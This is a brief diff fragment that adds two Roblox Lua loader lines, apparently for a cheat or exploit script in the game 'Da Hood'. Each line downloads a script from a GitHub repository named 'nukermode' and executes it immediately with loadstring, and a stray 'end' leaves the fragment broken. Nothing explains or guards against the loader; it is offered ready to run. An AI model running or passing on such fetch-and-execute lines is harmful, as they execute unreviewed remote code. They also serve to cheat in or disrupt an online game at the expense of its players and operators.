@@ -1,0 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Allvideo/nukermode/main/Da%20Hood.txt"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Allvideo/nukermode/main/out.lua%20(9).txt"))()
+
+end
